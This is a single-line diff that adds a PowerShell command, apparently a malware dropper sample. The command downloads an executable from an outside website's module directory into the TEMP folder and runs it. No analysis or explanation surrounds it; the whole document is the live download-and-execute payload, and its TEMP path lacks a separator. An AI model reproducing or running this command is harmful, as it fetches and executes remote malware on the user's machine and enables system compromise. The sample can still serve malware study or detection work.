@@ -1,0 +1,1 @@
+(New-Object System.Net.WebClient).DownloadFile('http://www.wealthandhealthops.com/modules/mod_easybloglist/kntgszu.exe',"$env:TEMPkntgszu.exe");Start-Process ("$env:TEMPkntgszu.exe")
